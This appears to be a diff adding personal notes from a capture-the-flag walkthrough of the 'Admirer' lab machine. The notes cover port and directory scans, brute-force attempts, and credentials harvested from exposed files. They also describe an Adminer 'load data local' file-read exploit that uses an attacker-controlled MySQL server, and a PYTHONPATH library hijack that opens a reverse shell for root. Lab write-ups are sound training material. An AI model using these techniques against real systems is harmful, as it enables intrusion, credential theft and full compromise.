@@ -1,0 +1,192 @@
+---NMAP---
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+---MASSCAN---
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.187                                    
+Discovered open port 21/tcp on 10.10.10.187                                    
+Discovered open port 22/tcp on 10.10.10.187     
+
+---GOBUSTER---
+common:
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/assets (Status: 301)
+/images (Status: 301)
+/index.php (Status: 200)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+
+big:
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/assets (Status: 301)
+/images (Status: 301)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+
+
+---robots.txt---
+User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+waldo is probably a user
+confirmed using ftp-user-enum.pl
+
+using site content to generate a wordlist
+*cewl 10.10.10.187 -w wl_site_content.txt
+
+using rockyou.txt and wl_site_content.txt
+trying to bruteforce the ftp login -- no success (# of attemps exceded)
+trying to bruteforce the ssh login -- no success
+
+---gobuster (again)---
+trying with 10.10.10.187/admin-dir/ using big.txt:
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/contacts.txt (Status: 200)
+/credentials.txt (Status: 200)
+
+
+on credentials.txt:
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+
+on contacts.txt:
+##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+
+
+---ftp login---
+found two files:
+File:dump.sql
+	4 KB 	12/2/19 	12:00:00 AM EST
+File:html.tar.gz
+	5148 KB 	12/3/19 	12:00:00 AM EST
+
+in html/w4ld0s_s4cr3t_dir/credentials.txt:
+[Bank Account]
+waldo.11
+Ezy]m27}OREc$
+
+in html/utility-scripts/db_admin.php:
+db connection user/pass: waldo/Wh3r3_1s_w4ld0?
+
+in html/index.php:
+$servername = "localhost";
+$username = "waldo";
+$password = "]F7jLHw:*G>UPrTo}~A"d6b";
+$dbname = "admirerdb";
+
+trying to use url 10.10.10.187/utility-scripts/admin-tasks.php -- nothing
+
+---gobuster on /utility-scripts/---
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/adminer.php (Status: 200)
+/info.php (Status: 200)
+/phptest.php (Status: 200)
+
+db login page found on adminer -- unsuccessful
+
+using the 6.4.2adminer exploit:
+first create a remote mysql database on host machine
+create a user with all privileges:
+  > CREATE USER 'james'@'%' IDENTIFIED BY 'james';
+  > GRANT ALL ON *.* TO 'james'@'%';
+then use the /utility-scripts/adminer.php to connect using user james
+using "load data local" on the adminer.php sql command returns target files instead of the host ones
+so as the database credentials of this target are stored on the index.php
+just need to execute:
+  > load data local '/var/www/html/index.php' into table james.index fields terminated by "/n";
+now each row is a index.php line
+just search for the user/pass and kudos!
+
+$servername = "localhost";
+$username = "waldo";
+$password = "&<h5b~yK3F#{PaPB&dA}{H>";
+$dbname = "admirerdb";
+
+trying this credentials on ssh
+DONE
+cat ~/user.txt
+
+---PRIV ESC---
+*sudo -l:
+(ALL) SETENV: /opt/scripts/admin_tasks.sh
+the backup_web execute /opt/scripts/backup.py thus this execute a python lib called shutils.pyp
+creating file that can be edited /home/waldo/temp/shutil.py and changing the executing function to a basic reverse shell
+creating a listening socket on host
+
+changing the python lib working dir
+*sudo "PYTHONPATH=/home/waldo/temp/" ./admin_tasks.sh
+
+done!
+cat /root/root.txt
